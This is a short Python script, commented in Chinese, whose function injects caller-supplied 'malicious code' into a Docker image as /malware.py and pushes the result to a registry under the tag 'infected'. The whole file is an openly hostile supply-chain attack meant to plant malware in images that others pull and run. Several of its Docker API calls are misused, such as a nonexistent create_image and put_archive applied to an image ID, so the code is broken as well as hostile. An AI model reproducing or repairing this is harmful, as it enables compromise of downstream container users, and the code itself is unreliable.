import docker

def create_and_inject_malicious_image_v3(image_name, malicious_code):
    client = docker.APIClient()
    
    # 建立一個空的映像
    base_image = client.create_image(image=image_name)
    
    # 將映像打上標籤
    client.tag(base_image, repo=image_name, tag='original')
    
    # 將惡意程式碼加入容器
    client.put_archive(base_image['Id'], '/malware.py', malicious_code.encode('utf-8'))
    
    # 把映像打包為.tar檔案
    tar_data = client.get_image(base_image['Id'])
    
    # 將.tar檔案載入成一個新的映像
    infected_image = client.load_image(tar_data)
    
    # Push到映像倉庫
    client.push(image_name, tag='infected')
    
    # 刪除臨時映像
    client.remove_image(infected_image['Id'])
    
    return f"{image_name}:infected"